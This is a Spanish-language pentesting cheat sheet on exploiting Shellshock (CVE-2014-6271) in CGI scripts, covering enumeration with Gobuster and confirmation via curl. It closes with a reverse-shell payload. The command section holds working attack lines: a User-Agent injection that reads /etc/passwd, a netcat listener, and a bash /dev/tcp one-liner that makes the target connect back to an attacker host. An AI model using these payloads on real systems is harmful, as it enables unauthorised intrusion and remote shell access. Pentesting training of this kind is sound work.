---
tags:
  - webapp
  - shellshock
  - attack
---
## Conceptos Clave (TL;DR)

* CGI actúa como intermediario entre servidores web, bases de datos y otras fuentes de información para renderizar páginas dinámicas. Los scripts suelen almacenarse en el directorio `/cgi-bin` y se ejecutan en el contexto de seguridad del servidor web.
* Shellshock (CVE-2014-6271) es una vulnerabilidad en versiones antiguas de Bash (hasta la versión 4.3) que permite la ejecución de comandos del sistema operativo a través de variables de entorno
* El vector de ataque se aprovecha de que las versiones vulnerables de Bash ejecutarán comandos maliciosos si estos se incluyen inmediatamente después de la definición de una función dentro de una variable de entorno.

## Herramientas Clave

* **Gobuster**: Utilizado para la enumeración de directorios y descubrimiento de scripts CGI en el servidor web.
* **cURL**: Empleado para interactuar con la aplicación web, revisar las cabeceras HTTP e inyectar el payload malicioso.
* **Burp Suite (Repeater/Intruder)**: Alternativa mencionada para realizar fuzzing sobre las cabeceras (como el User-Agent) y confirmar la vulnerabilidad de manera controlada.
* **Netcat (nc)**: Utilizado para levantar un listener y capturar la conexión entrante de la reverse shell.

## Metodología Paso a Paso

### Fase 1: Enumeración
El objetivo es encontrar la ubicación de los scripts CGI. Generalmente se ubican en el directorio `cgi-bin`. Se debe realizar fuerza bruta de directorios buscando archivos con la extensión `.cgi` para identificar posibles vectores de ataque.

### Fase 2: Confirmación de la Vulnerabilidad
Una vez identificado un script (incluso si al consultarlo no devuelve ningún output visible en la página ), se inyecta el payload de Shellshock en una cabecera HTTP procesada por el script. Usualmente se utiliza el campo `User-Agent`. Si el sistema es vulnerable, Bash interpretará la porción `() { :;};` como una función y ejecutará el comando inyectado a continuación, devolviendo el resultado (como el contenido de `/etc/passwd`) en la respuesta web.

### Fase 3: Explotación a Reverse Shell
Confirmada la ejecución de comandos, se reemplaza el comando de prueba por un one-liner de reverse shell. Esto obligará al servidor a conectarse de vuelta a la máquina del atacante, otorgando acceso interactivo al sistema en el contexto del usuario del servidor web.

## Cheat Sheet de Comandos

```bash'
# Prueba local para verificar si la version de Bash del sistema actual es vulnerable
# Define una funcion en la variable de entorno y prueba si se ejecuta el codigo posterior

env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

```bash
# Enumeracion de directorios para descubrir scripts CGI
# -u: URL objetivo | -w: Ruta del diccionario | -x: Extensiones a buscar

gobuster dir -u http://<TARGET_IP>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

```bash
# Peticion de diagnostico al script descubierto para ver su comportamiento y cabeceras
# -i: Muestra las cabeceras HTTP de respuesta

curl -i http://<TARGET_IP>/cgi-bin/<SCRIPT_NAME>.cgi
```

```bash
# Confirmacion de vulnerabilidad inyectando un comando en el User-Agent
# -H: Modifica la cabecera especifica. Ejecuta "cat /etc/passwd" si es vulnerable

curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<TARGET_IP>/cgi-bin/<SCRIPT_NAME>.cgi
```

```bash
# Levantar listener para recibir la conexion de la reverse shell
# -l: Modo escucha | -v: Verbose | -n: No resolucion DNS | -p: Puerto

sudo nc -lvnp <ATTACKER_PORT>
```

```bash
# Explotacion final enviando un reverse shell one-liner mediante cURL
# Redirige los flujos de entrada/salida de bash al socket TCP del atacante

curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1' http://<TARGET_IP>/cgi-bin/<SCRIPT_NAME>.cgi
```

## "Gotchas" y Troubleshooting

* **Persistencia en entornos modernos**: A pesar de ser una vulnerabilidad de 2014, es altamente probable encontrarla durante auditorías en dispositivos embebidos (IoT) o aplicaciones web legacy.

* **Comportamiento sin salida**: Un script puede devolver una respuesta HTTP 200 con `Content-Length: 0` al consultarse de manera estándar. Esto no significa que esté inactivo, sigue siendo un candidato válido para probar la inyección.

* **Mecanismos de parcheo**: En sistemas no vulnerables o parcheados, Bash simplemente no ejecutará código después de la definición de la función. Además, los sistemas modernos exigen que la definición de funciones en variables de entorno lleve el prefijo `BASH_FUNC_`.

* **Contexto de ejecución**: El éxito del ataque generalmente proporciona una shell como `www-data`, requiriendo escalada de privilegios posterior. Solo en casos de configuraciones muy inseguras se obtendrá acceso como `root` directamente si el servidor corre en un contexto elevado.